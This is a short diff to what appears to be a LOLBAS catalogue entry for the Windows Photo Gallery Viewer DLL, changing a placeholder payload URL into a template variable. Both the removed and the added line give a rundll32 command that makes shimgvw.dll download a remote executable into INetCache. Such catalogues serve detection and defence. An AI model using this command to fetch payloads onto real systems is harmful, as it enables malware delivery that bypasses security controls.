@@ -4,7 +4,7 @@ Description: Photo Gallery Viewer
 Author: Eral4m
 Created: 2021-01-06
 Commands:
-  - Command: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen http://x.x.x.x/payload.exe
+  - Command: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
     Description: Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.
     Usecase: Download file from remote location.
     Category: Download
